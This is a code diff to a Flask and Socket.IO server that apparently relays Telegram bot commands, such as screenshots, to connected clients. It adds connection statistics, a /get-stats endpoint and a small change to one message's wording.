@@ -6,6 +6,7 @@ from telebot import telebot
 from bot_messages_handler import *
 from config import *
 from utils import *
+from visiting_stats_counter import *
 import os
 
 app = Flask(__name__)
@@ -15,6 +16,7 @@ socketio = SocketIO(app)
 @app.route('/add-pending-client', methods=['POST'])
 def add_pending_client():
     pending_init_codes.append(request.form['init_code'])
+    update_overall_connections()
     return '0'
 
 @app.route('/wait-for-initialization', methods=['POST'])
@@ -28,6 +30,10 @@ def remove_client():
         return '1'
     del bot_users[request.form['init_code']]
     return '0'
+
+@app.route('/get-stats', methods=['GET'])
+def get_statistics():
+    return { 'overall': get_overall_connections(), 'active': len(bot_users), 'pending': len(pending_init_codes) }
 
 @socketio.on('command_response')
 def handle_command_response(data):
@@ -54,7 +60,7 @@ def handle_command_response(data):
     emit('handle_bot_command', current_user.last_command) if client_id in bot_users else emit('handle_reinitialization', '')
  
     if current_user.last_command == 'screenshot':
-        bot.send_message(current_user.chat_id, "Taking screenshot...")
+        bot.send_message(current_user.chat_id, "Taking a screenshot...")
 
     
     current_user.last_command = ''
